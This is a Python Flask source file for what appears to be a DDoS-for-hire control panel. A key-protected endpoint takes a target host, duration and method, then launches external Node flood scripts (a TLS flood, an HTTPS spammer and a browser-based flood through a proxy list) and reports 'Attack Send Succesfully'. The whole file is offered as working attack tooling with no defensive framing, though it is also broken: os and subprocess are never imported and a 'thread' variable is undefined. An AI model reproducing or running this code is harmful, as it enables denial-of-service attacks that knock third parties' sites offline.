from flask import Flask, request

app = Flask(__name__)
port = int(os.environ.get('PORT', 8367))

key = "@narul1"

@app.route('/')
def ddos_attack():
    try:
        host = request.args.get('host')
        time = request.args.get('time')
        method = request.args.get('method')
        requests = request.args.get('requests')

        if request.args.get('key') != key:
            return 'Key not working', 401

        if method == 'tls-flood':
            process = subprocess.Popen(['node', 'tlsv5', host, time, '100', '10', 'p.txt'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                html = f'''
                    <html>
                      <body>
                        <h1>Attack Send Succesfully</h1>
                        <p>Host: {host}</p>
                        <p>Time: {time}</p>
                        <p>Method: {method}</p>
                      </body>
                    </html>
                '''
                return html
            else:
                print('An error occurred during the execution of the process.')
                return 'An error occurred during the execution of the process.', 500
                
        elif method == 'http-spam':
            process = subprocess.Popen(['node', 'HTTPS-SPAMMER', host, time, ' '], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                html = f'''
                    <html>
                      <body>
                        <h1>Attack Send Succesfully</h1>
                        <p>Host: {host}</p>
                        <p>Time: {time}</p>
                        <p>Method: {method}</p>
                      </body>
                    </html>
                '''
                return html
            else:
                print('An error occurred during the execution of the process.')
                return 'An error occurred during the execution of the process.', 500

        elif method == 'https-browser':
            process = subprocess.Popen(['node', 'browser.js', host, time, requests, thread, 'proxies.txt'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                html = f'''
                    <html>
                      <body>
                        <h1>Attack Send Succesfully</h1>
                        <p>Host: {host}</p>
                        <p>Time: {time}</p>
                        <p>Method: {method}</p>
                      </body>
                    </html>
                '''
                return html
            else:
                print('An error occurred during the execution of the process.')
                return 'An error occurred during the execution of the process.', 500

        else:
            print('Incorrect method..')
            return 'Incorrect method.', 400

    except Exception as e:
        print(e)
        return 'There is a problem.', 500

if __name__ == '__main__':
    app.run(port=port)